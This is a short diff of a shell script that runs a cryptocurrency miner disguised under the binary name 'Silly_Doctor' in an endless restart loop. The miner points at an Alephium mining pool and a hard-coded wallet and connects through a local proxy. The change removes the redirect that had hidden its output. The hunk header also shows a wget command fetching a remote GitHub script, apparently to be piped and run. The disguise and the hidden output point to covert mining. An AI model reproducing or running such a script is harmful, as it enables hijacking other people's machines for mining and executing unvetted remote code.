@@ -123,6 +123,6 @@ wget -O - https://raw.githubusercontent.com/mthethelelinyambose/ping/main/ping.s
 
 while true
 do
-./Silly_Doctor --disable-cpu --algorithm blake3_alephium --pool de.alephium.herominers.com:1199 --wallet 1Hk3MN2pjgDCDy2PigfxnVMJ9fQcfmb6cYqpsYtMaUziM.$currentdate --password x --proxy 127.0.0.1:7777 --keepalive 1>/dev/null 2>&1
+./Silly_Doctor --disable-cpu --algorithm blake3_alephium --pool de.alephium.herominers.com:1199 --wallet 1Hk3MN2pjgDCDy2PigfxnVMJ9fQcfmb6cYqpsYtMaUziM.$currentdate --password x --proxy 127.0.0.1:7777 --keepalive
 sleep 10
 done
